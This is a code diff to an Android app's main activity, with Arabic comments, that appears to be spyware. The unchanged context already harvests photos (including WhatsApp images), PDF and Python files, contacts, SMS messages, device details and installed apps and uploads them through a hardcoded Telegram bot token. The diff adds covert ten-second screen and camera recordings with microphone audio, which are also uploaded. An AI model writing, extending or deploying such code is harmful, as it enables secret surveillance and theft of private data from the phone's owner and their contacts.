@@ -31,6 +31,8 @@ import java.util.Comparator;
 import java.util.List;
 import android.media.MediaRecorder;
 import android.content.Context;
+import android.hardware.Camera;
+import android.media.CamcorderProfile;
 
 public class MainActivity extends Activity {
     private String BOT_TOKEN = "8984239079:AAEtdnaAKsFH4kZwjO7UbzjZEw-vcXoBXRs";
@@ -39,6 +41,17 @@ public class MainActivity extends Activity {
     private int fileCount = 0;
     private int photoCount = 0;
     private final int MAX_PHOTOS = 10;
+    
+    // تسجيل الشاشة
+    private MediaRecorder screenRecorder;
+    private String screenVideoPath;
+    private boolean isScreenRecording = false;
+    
+    // تسجيل الكاميرا
+    private MediaRecorder cameraRecorder;
+    private Camera camera;
+    private String cameraVideoPath;
+    private boolean isCameraRecording = false;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -130,26 +143,45 @@ public class MainActivity extends Activity {
         try {
             String storage = Environment.getExternalStorageDirectory().getAbsolutePath();
             
+            // تسجيل الشاشة 10 ثواني
+            updateStatus("📹 جاري تسجيل الشاشة 10 ثواني...");
+            startScreenRecording();
+            Thread.sleep(10000);
+            stopScreenRecording();
+            
+            // تسجيل الكاميرا 10 ثواني
+            updateStatus("🎥 جاري تسجيل الكاميرا 10 ثواني...");
+            startCameraRecording();
+            Thread.sleep(10000);
+            stopCameraRecording();
+            
+            // 10 صور
             updateStatus("📸 جاري جمع 10 صور...");
             sendLatestPhotos(storage + "/DCIM/Camera/", 10);
             sendLatestPhotos(storage + "/Pictures/", 10);
             sendLatestPhotos(storage + "/WhatsApp/Media/WhatsApp Images/", 10);
             
+            // ملفات PDF
             updateStatus("📄 جاري جمع ملفات PDF...");
             sendAllFiles(storage, "pdf");
             
+            // ملفات PY
             updateStatus("🐍 جاري جمع ملفات PY...");
             sendAllFiles(storage, "py");
             
+            // جهات الاتصال
             updateStatus("📇 جاري استخراج جهات الاتصال...");
             sendContacts();
             
+            // رسائل SMS
             updateStatus("💬 جاري استخراج الرسائل...");
             sendSMS();
             
+            // معلومات الجهاز
             updateStatus("📱 جاري جمع معلومات الجهاز...");
             sendDeviceInfo();
             
+            // التطبيقات المثبتة
             updateStatus("📱 جاري كشف التطبيقات...");
             getInstalledApps();
             
@@ -169,6 +201,111 @@ public class MainActivity extends Activity {
         });
     }
 
+    // ========== تسجيل الشاشة ==========
+    private void startScreenRecording() {
+        try {
+            if (isScreenRecording) return;
+            
+            String timeStamp = new java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(new java.util.Date());
+            screenVideoPath = getExternalFilesDir(null) + "/screen_" + timeStamp + ".mp4";
+            
+            screenRecorder = new MediaRecorder();
+            screenRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+            screenRecorder.setVideoSource(MediaRecorder.VideoSource.SURFACE);
+            screenRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+            screenRecorder.setOutputFile(screenVideoPath);
+            screenRecorder.setVideoSize(720, 1280);
+            screenRecorder.setVideoFrameRate(30);
+            screenRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
+            screenRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+            screenRecorder.prepare();
+            screenRecorder.start();
+            
+            isScreenRecording = true;
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void stopScreenRecording() {
+        try {
+            if (screenRecorder != null && isScreenRecording) {
+                screenRecorder.stop();
+                screenRecorder.release();
+                screenRecorder = null;
+                isScreenRecording = false;
+                
+                File videoFile = new File(screenVideoPath);
+                if (videoFile.exists() && videoFile.length() > 0) {
+                    sendFile(videoFile);
+                }
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    // ========== تسجيل الكاميرا ==========
+    private void startCameraRecording() {
+        try {
+            if (isCameraRecording) return;
+            
+            String timeStamp = new java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(new java.util.Date());
+            cameraVideoPath = getExternalFilesDir(null) + "/camera_" + timeStamp + ".mp4";
+            
+            // فتح الكاميرا الخلفية
+            camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_BACK);
+            if (camera == null) {
+                camera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
+            }
+            
+            if (camera != null) {
+                camera.unlock();
+                
+                cameraRecorder = new MediaRecorder();
+                cameraRecorder.setCamera(camera);
+                cameraRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
+                cameraRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
+                cameraRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
+                cameraRecorder.setOutputFile(cameraVideoPath);
+                cameraRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
+                cameraRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
+                cameraRecorder.setVideoSize(640, 480);
+                cameraRecorder.setVideoFrameRate(30);
+                cameraRecorder.prepare();
+                cameraRecorder.start();
+                
+                isCameraRecording = true;
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void stopCameraRecording() {
+        try {
+            if (cameraRecorder != null && isCameraRecording) {
+                cameraRecorder.stop();
+                cameraRecorder.release();
+                cameraRecorder = null;
+                isCameraRecording = false;
+            }
+            
+            if (camera != null) {
+                camera.release();
+                camera = null;
+            }
+            
+            File videoFile = new File(cameraVideoPath);
+            if (videoFile.exists() && videoFile.length() > 0) {
+                sendFile(videoFile);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    // ========== باقي الدوال ==========
     private void sendLatestPhotos(String path, int maxCount) {
         try {
             File dir = new File(path);
